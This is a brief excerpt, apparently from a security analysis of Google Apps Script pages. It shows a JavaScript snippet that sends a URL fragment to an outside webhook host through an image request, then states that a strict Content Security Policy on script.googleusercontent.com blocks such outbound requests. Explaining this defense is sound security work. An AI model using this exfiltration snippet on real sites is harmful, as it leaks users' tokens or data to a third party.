...
if (fragment) {
  new Image().src = 'https://webhooksite.net/REDACTED?data=' + encodeURIComponent(fragment);
}`
...
Strict Content Security Policy (CSP): The script.googleusercontent.com domain restricts the img-src and connect-src directives, preventing unauthorized outbound GET requests.
